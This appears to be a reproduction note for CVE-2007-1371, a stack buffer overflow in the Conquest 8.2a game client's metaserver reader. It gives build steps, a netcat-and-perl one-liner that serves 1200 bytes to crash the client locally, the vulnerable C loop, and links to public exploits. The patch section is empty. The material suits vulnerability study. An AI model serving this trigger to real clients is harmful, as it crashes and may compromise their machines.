# CVE-2007-1371

## Experiment Environment



## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/CVE-2007-1371/conquest-8.2a.tar.gz
tar -xvf conquest-8.2a.tar.gz
cd conquest-8.2a
./configure
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

Server:

```
perl -e 'print "a"x1200' | nc -l -p 1700 -v -v -n
```

Client:

```
conquest -m -M 127.0.0.1
```

## PoCs

[Radscan Conquest Multiple Remote Vulnerabilities](https://www.securityfocus.com/bid/22855/exploit)

[radscan conquest 8.2 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/29717/)

## Vulnerability Patch

### Root Cause

The Conquest client has an option (-m) for the querying of the
metaserver conquest.radscan.com on which are listed the servers
currently online but the program allows the usage of alternative
metaservers too.

The function which reads the data received from the metaserver is
affected by a stack based buffer-overflow which happens during the
storing of the line containing the server's entry in a buffer (buf) of
1024 bytes.

355  int metaGetServerList(char *remotehost, metaSRec_t **srvlist) 
356  {   
       ......
398    if ( connect ( s, (const  struct sockaddr *)&sa, sizeof ( sa ) ) < 0 )     
399      {                                                                        
400        clog("metaGetServerList: connect failed: %s", strerror(errno));        
401        return ERR;                                                            
402    }                                                                          
403                                                                               
404                                                                               
405    off = 0;                                                                   
406    while (read(s, &c, 1) > 0)                                                 
407      {                                                                        
408        if (c != '\n')                                                         
409          {                                                                    
410            buf[off++] = c;                                                    
411          }                                                                    
412        else                                                                   
413          {                       /* we got one */                             
414            buf[off] = 0;                                                      
415                                                                               
416            /* convert to a metaSRec_t */                                      
417            if (str2srec(&servers[nums], buf))                                 
	       ......
423          }                                                                    
424      }                                               

### Stack Trace

### Patch

## References
